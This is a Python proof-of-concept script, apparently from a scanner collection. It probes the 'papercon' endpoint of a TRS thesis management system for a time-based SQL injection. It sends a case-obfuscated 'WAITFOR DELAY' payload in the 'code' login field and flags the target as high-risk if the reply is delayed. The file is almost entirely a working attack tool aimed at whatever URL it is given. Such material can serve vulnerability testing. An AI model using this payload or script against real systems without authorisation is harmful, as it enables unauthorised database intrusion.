#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS学位论文系统papercon处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0124453
author: Lucifer
description: 文件papercon中,参数code存在SQL注入。
'''
import sys
import time
import json
import requests
import warnings
from termcolor import cprint

class trs_lunwen_papercon_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data ={
            "action":"login",
            "r_code":"%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5",
            "r_password":"%C3%DC%C2%EB%B2%BB%C4%DC%CE%AA%BF%D5",
            "code":"test';WaItFoR/**/DeLay/**/'0:0:6'--",
            "password":"dsdfaf"
        }
        payload = "/papercon"
        vulnurl = self.url + payload
        start_time = time.time()
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                cprint("[+]存在TRS学位论文系统papercon处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_lunwen_papercon_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
